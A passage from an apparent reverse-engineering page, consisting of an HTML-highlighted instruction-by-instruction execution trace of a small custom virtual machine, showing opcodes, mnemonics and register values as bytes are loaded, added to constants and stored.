class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x39</span> b:<span class="hljs-number">0x37</span> c:<span class="hljs-number">0x37</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x62</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x39</span> b:<span class="hljs-number">0x37</span> c:<span class="hljs-number">0x37</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x63</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3a</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3a</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3a</span> b:<span class="hljs-number">0x37</span> c:<span class="hljs-number">0x37</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x64</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x3e</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x3e</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3a</span> b:<span class="hljs-number">0x37</span> c:<span class="hljs-number">0x3e</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x65</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3a</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x3e</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x66</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3a</span> b:<span class="hljs-number">0x3e</span> c:<span class="hljs-number">0x3e</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x67</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3a</span> b:<span class="hljs-number">0x3e</span> c:<span class="hljs-number">0x3e</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x68</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3b</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3b</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3b</span> b:<span class="hljs-number">0x3e</span> c:<span class="hljs-number">0x3e</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x69</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x7f</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x7f</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3b</span> b:<span class="hljs-number">0x3e</span> c:<span class="hljs-number">0x7f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3b</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x7f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3b</span> b:<span class="hljs-number">0x7f</span> c:<span class="hljs-number">0x7f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3b</span> b:<span class="hljs-number">0x7f</span> c:<span class="hljs-number">0x7f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3c</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3c</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3c</span> b:<span class="hljs-number">0x7f</span> c:<span class="hljs-number">0x7f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xc1</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xc1</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3c</span> b:<span class="hljs-number">0x7f</span> c:<span class="hljs-number">0xc1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x6f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3c</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xc1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x70</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3c</span> b:<span class="hljs-number">0xc1</span> c:<span class="hljs-number">0xc1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x71</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3c</span> b:<span class="hljs-number">0xc1</span> c:<span class="hljs-number">0xc1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x72</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3d</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3d</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3d</span> b:<span class="hljs-number">0xc1</span> c:<span class="hljs-number">0xc1</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x73</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0xfa</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0xfa</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3d</span> b:<span class="hljs-number">0xc1</span> c:<span class="hljs-number">0xfa</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x74</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3d</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0xfa</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x75</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3d</span> b:<span class="hljs-number">0xfa</span> c:<span class="hljs-number">0xfa</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x76</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3d</span> b:<span class="hljs-number">0xfa</span> c:<span class="hljs-number">0xfa</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x77</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3e</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3e</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3e</span> b:<span class="hljs-number">0xfa</span> c:<span class="hljs-number">0xfa</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x78</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x53</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x53</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3e</span> b:<span class="hljs-number">0xfa</span> c:<span class="hljs-number">0x53</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x79</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3e</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x53</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3e</span> b:<span class="hljs-number">0x53</span> c:<span class="hljs-number">0x53</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3e</span> b:<span class="hljs-number">0x53</span> c:<span class="hljs-number">0x53</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x3f</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x3f</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3f</span> b:<span class="hljs-number">0x53</span> c:<span class="hljs-number">0x53</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x5f</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x5f</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3f</span> b:<span class="hljs-number">0x53</span> c:<span class="hljs-number">0x5f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3f</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x5f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x7f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3f</span> b:<span class="hljs-number">0x5f</span> c:<span class="hljs-number">0x5f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x80</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x3f</span> b:<span class="hljs-number">0x5f</span> c:<span class="hljs-number">0x5f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x81</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x40</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x40</span> b:<span class="hljs-number">0x5f</span> c:<span class="hljs-number">0x5f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x82</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x99</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x99</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x40</span> b:<span class="hljs-number">0x5f</span> c:<span class="hljs-number">0x99</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x83</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x40</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x99</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x84</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x40</span> b:<span class="hljs-number">0x99</span> c:<span class="hljs-number">0x99</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x85</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x40</span> b:<span class="hljs-number">0x99</span> c:<span class="hljs-number">0x99</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x86</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x41</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x41</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x41</span> b:<span class="hljs-number">0x99</span> c:<span class="hljs-number">0x99</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x87</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x31</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x31</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x41</span> b:<span class="hljs-number">0x99</span> c:<span class="hljs-number">0x31</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x88</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x41</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x31</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x89</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x41</span> b:<span class="hljs-number">0x31</span> c:<span class="hljs-number">0x31</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x41</span> b:<span class="hljs-number">0x31</span> c:<span class="hljs-number">0x31</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x42</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x42</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x42</span> b:<span class="hljs-number">0x31</span> c:<span class="hljs-number">0x31</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x38</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x38</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x42</span> b:<span class="hljs-number">0x31</span> c:<span class="hljs-number">0x38</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8d</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x42</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x38</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8e</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x42</span> b:<span class="hljs-number">0x38</span> c:<span class="hljs-number">0x38</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x8f</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x42</span> b:<span class="hljs-number">0x38</span> c:<span class="hljs-number">0x38</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x90</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x43</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x43</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x43</span> b:<span class="hljs-number">0x38</span> c:<span class="hljs-number">0x38</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x91</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x8f</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x8f</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x43</span> b:<span class="hljs-number">0x38</span> c:<span class="hljs-number">0x8f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x92</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x43</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x8f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x93</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x43</span> b:<span class="hljs-number">0x8f</span> c:<span class="hljs-number">0x8f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x94</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x43</span> b:<span class="hljs-number">0x8f</span> c:<span class="hljs-number">0x8f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x95</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x44</span><br>[<span class="hljs-meta">s</span>] IMM a = <span class="hljs-number">0x44</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0x8f</span> c:<span class="hljs-number">0x8f</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x96</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x20</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0x89</span><br>[<span class="hljs-meta">s</span>] IMM c = <span class="hljs-number">0x89</span><br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0x8f</span> c:<span class="hljs-number">0x89</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x97</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x40</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x2</span><br>[<span class="hljs-meta">s</span>] LDM b = *a<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0</span> c:<span class="hljs-number">0x89</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x98</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x4</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0x20</span><br>[<span class="hljs-meta">s</span>] ADD b c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0x89</span> c:<span class="hljs-number">0x89</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x99</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x1</span> arg1:<span class="hljs-number">0x2</span> arg2:<span class="hljs-number">0x40</span><br>[<span class="hljs-meta">s</span>] STM *a = b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0x89</span> c:<span class="hljs-number">0x89</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x3</span> i:<span class="hljs-number">0x9a</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x20</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK c NONE<br>[<span class="hljs-meta">s</span>] ... popping c<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0x89</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x2</span> i:<span class="hljs-number">0x9b</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x40</span> arg2:<span class="hljs-number">0</span><br>[<span class="hljs-meta">s</span>] STK b NONE<br>[<span class="hljs-meta">s</span>] ... popping b<br>[<span class="hljs-meta">V</span>] a:<span class="hljs-number">0x44</span> b:<span class="hljs-number">0xde</span> c:<span class="hljs-number">0x5</span> d:<span class="hljs-number">0x4</span> s:<span class="hljs-number">0x1</span> i:<span class="hljs-number">0x9c</span> f:<span class="hljs-number">0</span><br>[<span class="hljs-meta">I</span>] op:<span class="hljs-number">0x80</span> arg1:<span class="hljs-number">0x2</span> arg2:<span 